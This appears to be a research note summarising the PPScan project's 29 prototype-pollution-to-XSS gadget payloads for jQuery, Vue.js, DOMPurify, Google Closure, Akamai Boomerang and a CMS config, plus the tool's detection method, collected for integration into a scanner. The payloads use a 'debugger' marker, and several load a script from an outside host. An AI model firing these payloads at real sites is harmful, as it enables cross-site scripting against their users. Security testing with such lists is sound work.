# PPScan Gadget Payloads - Prototype Pollution to XSS

Source: msrkp/PPScan (GitHub)
Value: DIRECT TITAN INTEGRATION - Prototype pollution detection + escalation

## 29 Gadgets for Prototype Pollution → XSS

### jQuery Gadgets
1. `__proto__[innerHTML]=<img/src/onerror=debugger>` - Direct innerHTML overwrite
2. `__proto__[context]=<img/src/onerror%3ddebugger>&__proto__[jquery]=x` - jQuery context gadget
3. `__proto__[url][]=data:,debugger//&__proto__[dataType]=script` - jQuery AJAX load
4. `__proto__[url]=data:,debugger//&__proto__[dataType]=script&__proto__[crossDomain]=` - jQuery AJAX
5. `__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3ddebugger>&__proto__[div][2]=1` - jQuery DOM manipulation
6. `__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3ddebugger>` - jQuery event delegation
7. `__proto__[attrs][src]=1&__proto__[src]=//p6.is/ppscan.php` - jQuery attr gadget
8. `__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3ddebugger>&__proto__[script][2]=1` - jQuery script tag

### DOMPurify Bypass
9. `__proto__[innerHTML]=<img/src/onerror=debugger>` - DOMPurify bypass via innerHTML

### Vue.js Gadgets
10. `__proto__[v-if]=_c.constructor('debugger')()` - Vue.js v-if code execution
11. `__proto__[v-bind:class]=''.constructor.constructor('debugger')()` - Vue.js v-bind code execution

### Generic Gadgets
12. `__proto__[srcdoc][]=<script>debugger</script>` - srcdoc injection
13. `__proto__[hif][]=javascript:debugger` - javascript: URI injection
14. `__proto__[sourceURL]=%E2%80%A8%E2%80%A9debugger` - Line/Paragraph separator bypass
15. `__proto__[innerText]=<script>debugger</script>` - innerText injection
16. `__proto__[CLOSURE_BASE_PATH]=data:,debugger//` - Google Closure injection
17. `__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=debugger` - Tag manipulation
18. `__proto__[src]=data:,debugger//` - Direct src injection
19. `__proto__[xxx]=debugger` - Custom property
20. `__proto__[onload]=debugger` - Event handler injection
21. `__proto__[onerror]=debugger` - Event handler injection
22. `__proto__[div][intro]=<img%20src%20onerror%3ddebugger>` - Property injection
23. `__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>debugger</script>` - Template injection
24. `__proto__[template]=<script>debugger</script>` - Template overwrite
25. `__proto__[srcdoc]=<script>debugger</script>` - srcdoc overwrite

### Analytics Gadgets
26. `__proto__[BOOMR]=1&__proto__[url]=//p6.is/ppscan.php` - Akamai Boomerang
27. `__proto__[4]=a':1,[debugger]:1,'b&__proto__[5]=,` - String manipulation

### Framework Gadgets
28. `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('debugger')(),"` - Framework props
29. `__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//p6.is/ppscan.php` - CMS config

## Detection Method
- Injects test properties `e32a5ec9c99` and `a0def12bce` via URL parameters
- Checks if properties appear on `Object.prototype`
- Tests both `?` query params and `#` hash fragments
- Supports frame-busting bypass via window mode

## Value for Titan
- Can be integrated as a detection module
- Shows real-world gadget chains for escalation
- Database of 30+ vulnerable URL parsers
- Direct mapping to sturdy-octo findings (prototype pollution confirmed)
